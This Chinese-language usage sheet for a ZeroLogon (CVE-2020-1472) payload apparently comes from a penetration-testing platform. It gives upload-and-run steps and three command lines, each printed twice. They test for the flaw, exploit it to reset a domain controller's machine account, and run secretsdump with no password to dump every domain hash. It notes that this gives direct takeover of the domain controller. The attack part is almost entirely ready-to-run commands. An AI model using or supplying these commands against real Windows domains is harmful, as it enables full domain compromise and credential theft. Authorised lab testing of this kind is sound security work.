## 📦 载荷使用说明：zerologon.sh

该载荷文件主要配合 **ZeroLogon** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `ZeroLogon` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
python3 zerologon_tester.py DC01 192.168.1.10
```

**配置示例 2**：
```bash
python3 cve-2020-1472-exploit.py DC01 192.168.1.10
```

**配置示例 3**：
```bash
python3 secretsdump.py -no-pass -just-dc \\
  corp/DC01\\\$@192.168.1.10
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## ZeroLogon CVE-2020-1472

### 漏洞验证
```bash
python3 zerologon_tester.py DC01 192.168.1.10
```

### 利用漏洞
```bash
python3 cve-2020-1472-exploit.py DC01 192.168.1.10
```

### 获取 Hash
```bash
python3 secretsdump.py -no-pass -just-dc \\
  corp/DC01\\\$@192.168.1.10
```

### 影响版本
- Windows Server 2008 R2 ~ 2019 (未打补丁)

- ⚠ 极危漏洞，可直接拿下域控
- ⚠ 利用后需恢复机器账户密码